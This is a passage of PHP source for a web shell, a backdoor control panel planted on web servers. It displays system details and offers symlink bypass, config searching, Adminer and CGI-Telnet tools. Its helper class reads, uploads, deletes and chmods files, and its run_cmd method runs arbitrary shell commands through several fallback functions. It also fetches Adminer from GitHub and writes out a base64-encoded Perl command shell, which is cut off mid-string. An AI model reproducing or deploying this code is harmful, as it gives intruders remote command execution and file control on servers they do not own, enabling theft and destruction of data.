                <li class="toggle" onclick="symlink();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABJ0lEQVRYhe2T0W3DIBCGP3cDOoI7gjtCV/AK7gjxCM4I7QjpCPEIyQhZIRnh70OO6ESgjpo+RCqfhA6OA/47ACqVSqVSeSQkIWmQtJW0k7SRFCR1Nt5Jai0O5/PzQ9IPkia3XyupKOBNZ462QGYxUZK0ckIl6WCHlDhkxpcznxINndkZeAdG6wezAIPZ3uxnsscIPANfzvcCvAInoHVrryoQXOYx+8GVPGYTsz/aGl+BYLFTUsF4ZZJ0EZBWIABrl30LfLjKxKwmNz5ls7mRVEAPbDiXOWTio4A4l5b/bgFr27QDVuYbgb31907E7Px/g7ur4O4ybfEd9Ik/tya3R9AP33Cp+a93S3yxRdIrWKL09X5N4wfF0lwLmLnz9TdNsxxUqVT+Bd9dUuNpd1va5QAAAABJRU5ErkJggg=="></i><span>SYM Bypass</span></li>
                <li class="toggle" onclick="config_searcher();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABIklEQVRYhe1V2w2DMAy8Vl0gK7ACK9ARmIUV2hFYgRVgBDpCGaEd4fpRu7IChED5IydFMY6TO+w8gISEhISj4zQ3QDJ2jRJABuAeJDrNUs0LiGg9v+iXYlcjgrwU8pfYmwScI7RUAHppNQBn/IpCegegkdjGzK1X/T3wy8CNY/Qk3YTPlmQ0Z4sAS1KQzEi2QlKaEii5LYnG//bIHM8loKEw9gPAG8DV+EovPpd+ANCJ3Rn/agEPYzsRUIndTcQPJlaRhciDkLS2ksKnSedL0uuXwMmYH795D+iirVnoSTL3am7vgFxiVKjO3SzACnEcn2/n2bo51a+nqPlXQGzTEjRCrt/VMuM+AnJDqqgZuAn3eIymoEd0gJym1Y9RQkLCYfABnDR7je5K+3YAAAAASUVORK5CYII="></i><span>Config Searcher</span></li>
                <li class="toggle" onclick="cgi_telnet();"><i><img style="width:16px;height:16px;" src="data: image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAACc0lEQVRYhe2X3XHqMBCFP5g04JRgSuCWQEogJZgSoAT8npdQApQAJeAS4hJwCcnD7o7WhgEZ29wXnxmN/KOfo9090gpGjBhxF5PV19er55wDJVDFNJ4Oy+UKa+AM/ABpTIdXEzQksQ3fhmRxAzlQIO4tYzq0sWAKfAMXLXsknjzWiPsuwFbfj1oAMv22jZ001oIpEjveNUtgAXwgVjFCnmwTifaJRqwF1zp4BXwqqUq/ZcgCjNBJ/6+IVOo9tLEgwEELwLv7762yIsSXJ/4U2qq4s0XaIpagWWSJuDVBRHJELOSJm8XmiPtfQnCndUpQsYmk0HLSNhnwy7WoBiVYIIHv964SEYwR88/oc/4qgjbhDJhomREEA+LSHBHPBFmQodA6d/2j0OdJskdcWgAbwhbkCbZGn2fxRus5Ih4jXNHB1X1acIfEZUYQR4mQizp3b6HvZOFEXSid8b/SrWg8a8GEkMlY+jQIpoR0qM2ub0I4cp1ydUXmxuaNcND3GjsdUEvJfAwac/9+Jhxb97ISb9EM2WIu+r5stF3o/18kuf0mqD6j7smjj8GUkFY1k8+5K583CPpV+9RroWWGbDVLJefnzLTNPx3HX6YW3oI75HjyOdwGOZaM1JLHMXdQQn4hZsWta/Ou7SpH9EBITAA+PMESicPaCrgW0KOU3TbsAyGurU/q6j3iXj9uSX1TP7XZZmyyvreUolHX4An648mQI8Tm1NUedem+gVL7HnTsRwlFMnU/1oiyzD0g7j1r2SKx9PS5SoivLaLgH4IgbVw//mWKXHKa7FeEDMREYSLqghwRngkjIdwCjZhZ9+X3nxEjRgyBP3xcmbgIVhRmAAAAAElFTkSuQmCC"></i><span>CGI-Telnet</span></li>
                <li class="toggle" onclick="adminer();"><i><img style="width:16px;height:16px;" src="data: image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AAAA/wBhTgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAERERAAAAAAETMzEQAAAAATERExAAAAABMRETEAAAAAExERMQAAAAATERExAAAAABMRETEAAAAAEzMzMREREQATERExEhEhABEzMxEhEREAAREREhERIRAAAAARIRESEAAAAAESEiEQAAAAABEREQAAAAAAAAAAD//9UAwP/VAIB/AACAf/AAgH+kAIB/gACAfwAAgH8AAIABAACAAf8AgAH/AMAA/wD+AP8A/wAIAf+B1QD//9UA"></i><span>Adminer</span></li>
            </ul>
        </div>

        <div class="popup-box alert">
        </div>
        <div class="popup-box success">
        </div>

        <div class="title">

            <h3></h3>
            <ul>
                <li><span></span> <?php print $_SERVER['SERVER_SOFTWARE']. ' | PHP Version: '.@phpversion();?></li>
                <li><span></span> <?php print @php_uname() ? @php_uname() : 'Unable to get that information';?></li>
                <li><span></span> uid=<?php print @getmyuid();?>(<?php print @get_current_user();?>) gid=<?php print @getmygid();?>(<?php $group = @posix_getgrgid(@getmygid()); print $group['name'] ? $group['name'] : @get_current_user();?>)</li>
                <li><span></span> <?php $user_count = $helpers->get_users_count(); if($user_count != 'Windows not supported'){ print '<font class="toggle" style="cursor:pointer;text-decoration:underline;color:blue;font-weight:bold" onclick="user_list();">'.$user_count.'</font>';}else{print $user_count;} ?></li>
                <li><span></span> <?php $group_count= $helpers->get_groups_count(); if($group_count != 'Windows not supported'){print '<font class="toggle" style="cursor:pointer;text-decoration:underline;color:blue;font-weight:bold" onclick="group_list();">'.$group_count.'</font>';}else{print $group_count;} ?></li>
                <li><span></span> <?php if(@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){ print "<font style='color:red'>ON (secure)</font>"; }else { print "<strong><font style='color:green'>OFF</font></strong>";} ?> </li>
                <li><span></span> <?php $v = @ini_get("open_basedir"); if ($v or strtolower($v) == "on"){ print "<font style='color:red'>" . $v . "</font>"; }else{ print "<strong><font style='color:green'>OFF</font></strong>";}?></li>
                <li><span></span> <?php $s = @ini_get('upload_max_filesize'); if(!empty($s)){print $s;}else{print 'Unable to get that information'; } ?></li>
                <li><span></span> <p><?php $ext = @get_loaded_extensions(); print implode(',',$ext);?></p></li>
                <li><span></span> <p><?php print $_SERVER['SERVER_ADDR']; ?></p></li>
                <li style="margin-top:5px"><span></span><p><form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();"><div id="path"></div></form></p></li>
                <li style="margin-top:5px"><span></span><p><form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();"><input type="text" style="background:none;border:1px solid rgba(255,255,255,.3);width:600px;height:35px;padding-left:5px;" autocomplete="off" required id="curr_dir" value=""/><button onclick="change_dir();" style="margin-left:5px;text-align:center;height:35px;cursor:pointer;font-weight:bold;border:none;background:rgba(0,0,0,.2);;color:#fff;padding:10px;width:150px;text-align:center">Change dir</button></form></p></li>
                <li style="margin-top:5px"><span></span><p><form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();"><input class="toggle" type="text" style="background:none;border:1px solid rgba(255,255,255,.3);width:600px;height:35px;padding-left:5px;" autocomplete="off" required id="read_file" value=""/><button class="toggle" onclick="readfile();" style="margin-left:5px;text-align:center;height:35px;cursor:pointer;font-weight:bold;border:none;background:rgba(0,0,0,.2);;color:#fff;padding:10px;width:150px;text-align:center">Read File</button></form></p></li>

            </ul>
        </div>
        
        <div class="inner">
        <div class="loaderhold"><div class="loader"></div></div>
            <table cellspacing="0" cellpadding="0">
                <thead>
                    <tr>
                        <th style="text-align:center;"></th>
                        <th style="text-align:left;">Name</th>
                        <th>Size</th>
                        <th>Last Modified</th>
                        <th>Permissions</th>
                        <th>Action</th>
                    </tr>
                </thead>
                
                <tbody>

                </tbody>
        
            </table>
        </div>

        <div class="process-screen" id="screen"></div>

    </div>

</div>


</body>
</html>


<?php

class helpers{


    public function list_dir($target = '.'){
        if(!@chdir($target)) return false;
        $dirpath     = @getcwd();
        $current_dir = @scandir($target);
        unset($current_dir[0]);
        $dirs  = [];
        $files = [];
        $current_dir = @array_values($current_dir);

        foreach($current_dir as $data){
            if(is_dir($data)){
                $dirs['name'][] = $data;
                $dirs['type'][] = $this->get_type($data);
                $dirs['perms'][] = $this->view_perms_color($data);
                $dirs['perm_num'][] = $this->view_perm_number($data);
                $dirs['size'][] = $this->get_size($data);
                $dirs['modify'][] = $this->modify_time($data);
            }else{
                $files['name'][] = $data;
                $files['type'][] = $this->get_type($data);
                $files['perms'][] = $this->view_perms_color($data);
                $files['perm_num'][] = $this->view_perm_number($data);
                $files['size'][] = $this->get_size($data);
                $files['modify'][] = $this->modify_time($data);
            }
            
        }
        $return_list = [];
        $count       = @count($dirs['name']);
        for($i = 0; $i < $count; $i++){
            $return_list['name'][]   = $dirs['name'][$i];
            $return_list['path'][]   = $dirpath.'/'.$dirs['name'][$i];
            $return_list['type'][]   = $dirs['type'][$i];
            $return_list['perms'][]  = $dirs['perms'][$i];
            $return_list['perm_num'][]      = $dirs['perm_num'][$i];
            $return_list['size'][]   = $dirs['size'][$i];
            $return_list['modify'][] = $dirs['modify'][$i];

        }
        $count2       = @count($files['name']);
        for($x = 0; $x < $count2; $x++){
            $return_list['name'][]   = $files['name'][$x];
            $return_list['path'][]   = $dirpath.'/'.$files['name'][$x];
            $return_list['type'][]   = $files['type'][$x];
            $return_list['perms'][]  = $files['perms'][$x];
            $return_list['perm_num'][]= $files['perm_num'][$x];
            $return_list['size'][]   = $files['size'][$x];
            $return_list['modify'][] = $files['modify'][$x];
        }
        $return_list['current_dir'][] = str_replace('\\','/',@getcwd());

        return $return_list;
    }
    public function get_type($target){
        if(is_dir($target)){
            return 'directory';
        }else{
            return 'file';
        }
    }
    public function get_size($target){
        if(is_file($target)){
            return $this->human_filesize(@filesize($target));
        }else{
            return 'DIR';
        }
    }
    public function modify_time($target){
        return date('d/m/Y - H:i:s',@filemtime($target));
    }
    public function human_filesize($bytes, $decimals = 2) {
        // https://gist.github.com/liunian/9338301
        $size = array('B','kB','MB','GB','TB','PB','EB','ZB','YB');
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
    }
    // view_perms & view_perms_color functions are taken from c99
    // Updated by: KaizenLouie for PHP 7
    // Find it on github
    public function view_perms($mode){

            if (($mode & 0xC000) === 0xC000)
            {
                $type = "s";
            }
            elseif (($mode & 0x4000) === 0x4000)
            {
                $type = "d";
            }
            elseif (($mode & 0xA000) === 0xA000)
            {
                $type = "l";
            }
            elseif (($mode & 0x8000) === 0x8000)
            {
                $type = "-";
            }
            elseif (($mode & 0x6000) === 0x6000)
            {
                $type = "b";
            }
            elseif (($mode & 0x2000) === 0x2000)
            {
                $type = "c";
            }
            elseif (($mode & 0x1000) === 0x1000)
            {
                $type = "p";
            }
            else
            {
                $type = "?";
            }
            $owner["read"] = ($mode & 00400) ? "r" : "-";
            $owner["write"] = ($mode & 00200) ? "w" : "-";
            $owner["execute"] = ($mode & 00100) ? "x" : "-";
            $group["read"] = ($mode & 00040) ? "r" : "-";
            $group["write"] = ($mode & 00020) ? "w" : "-";
            $group["execute"] = ($mode & 00010) ? "x" : "-";
            $world["read"] = ($mode & 00004) ? "r" : "-";
            $world["write"] = ($mode & 00002) ? "w" : "-";
            $world["execute"] = ($mode & 00001) ? "x" : "-";
            if ($mode & 0x800)
            {
                $owner["execute"] = ($owner["execute"] == "x") ? "s" : "S";
            }
            if ($mode & 0x400)
            {
                $group["execute"] = ($group["execute"] == "x") ? "s" : "S";
            }
            if ($mode & 0x200)
            {
                $world["execute"] = ($world["execute"] == "x") ? "t" : "T";
            }
            return $type . join("", $owner) . join("", $group) . join("", $world);
    }
    public function view_perms_color($o)
    {
        if (!is_readable($o))
        {
            return "<font style='color:red'>" . $this->view_perms(@fileperms($o)) . "</font>";
        }
        elseif (!is_writable($o))
        {
            return "<font style='color:white'>" . $this->view_perms(@fileperms($o)) . "</font>";
        }
        else
        {
            return "<font style='color:green'>" . $this->view_perms(@fileperms($o)) . "</font>";
        }
    }
    public function view_perm_number($file){
        return substr(sprintf("%o", @fileperms($file)), -4);
    }
    public function folderSize ($dir)
    {
        $size = 0;
        $contents = glob(rtrim($dir, '/').'/*', GLOB_NOSORT);

        foreach ($contents as $contents_value) {
            if (is_file($contents_value)) {
                $size += filesize($contents_value);
            } else {
                $size += $this->folderSize($contents_value);
            }
        }

        return $size;
    }
    public function download_file($file,$remove = false){
        $pathinfo = pathinfo($file);

        header('Content-type: application/octet-stream');
        header("Content-Disposition: attachment; filename=".$pathinfo['basename']);

        ob_end_clean();
        if(is_readable($file)){
            readfile($file);
            if($remove) @unlink($file);
            exit;
        }else{
            return false;
        }
    }
    public function remove_file($file){
        if(is_dir($file)){
            $rmdir = $this->delete_dir($file);
            if($rmdir){
                return true;
            }else{
                return false;
            }
        }else{
            if(@unlink($file)){
                return true;
            }else{
                return false;
            }
        }
        
    }
    public function delete_dir($dir) { 
        $files = array_diff(scandir($dir), array('.','..')); 
         foreach ($files as $file) 
           (is_dir("$dir/$file")) ? $this->delete_dir("$dir/$file") : @unlink("$dir/$file"); 
         if(rmdir($dir)){
             return true;
         }else{
             return false;
         }
    } 

    public function set_chmod($target,$mode){
        if(@chmod($target,octdec($mode))){
            return true;
        }else{
            return false;
        }
    }
    public function rename($target,$name,$old_name){
        $new_name = str_replace($old_name,$name,$target);
        if(@rename($target,$new_name)){
            return true;
        }else{
            return false;
        }
    }
    public function file_upload($temp,$filename,$where){
        if(function_exists('move_uploaded_file')){
            if(@move_uploaded_file($temp,$where.'/'.$filename)){
                return true;
            }else{
                return false;
            }
        }elseif(function_exists('copy')){
            if(@copy($temp,$where.'/'.$filename)){
                return true;
            }else{
                return false;
            }
        }else{
            return false;
        }
    }
    public function seperate_path(){
        $d = str_replace("\\", '/', @getcwd());

        $pd = $e = explode('/', $d);
        $i = 0;
        $paths = [];
        foreach ($pd as $b)
        {
            $t = "";
            $j = 0;
            foreach ($e as $r)
            {
                $t .= $r.'/';
                if ($j == $i)
                {
                    break;
                }
                $j++;
            }
            $paths[$b] = $t;
            $i++;
        }
        return $paths;
    }
    public function run_cmd($cmd,$dir = null){
        if($dir != null) @chdir($dir);
        if(function_exists("shell_exec")){
            $run = shell_exec($cmd);
            return 'shell_exec|'.trim($run);
        }elseif(function_exists("exec")){
            $run = exec($cmd,$result);
            return 'exec|'.implode("\r\n",array_map('trim',$result));
        }elseif(function_exists("popen")){
            $run = popen($cmd,"r");
            $result = "";
            while(!feof($run)){
                $buffer = fgets($run,4096);
                $result .= "-> $buffer\r\n";
            }
            pclose($run);
            return 'popen|'.trim($result);
        }elseif(function_exists("passthru")){
            passthru($cmd);
            $content    = ob_get_clean();
            return 'passthru|'.trim($content);
        }elseif(function_exists("system")){
            system($cmd);
            $content    = ob_get_clean();
            return 'system|'.trim($content);
        }else{
            return false;
        }
    }
    public function getClientIP() {  
         if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
            $ip = $_SERVER['HTTP_CLIENT_IP'];  
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
        } else{  
            $ip = $_SERVER['REMOTE_ADDR'];  
        }  
        return $ip;  
    } 

    public function get_adminer(){
        // https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php
        $name   = 'adminer-web.php';

        if(file_exists($name)){
            return true;
        }else{
            $curl = curl_init();
            curl_setopt_array($curl,[CURLOPT_RETURNTRANSFER => 1,CURLOPT_URL => 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php',CURLOPT_FOLLOWLOCATION => 1,CURLOPT_TIMEOUT => 20]);
            $output = curl_exec($curl);
            curl_close($curl);
    
            if(@file_put_contents($name,$output)){
                return true;
            }else{
                return false;
            }
        }

    }

    public function get_cgitelnet(){
        $name 	       = 'cgi_web.pl';
		$cgiTelnetCode = base64_decode('IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAibXdzIjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7I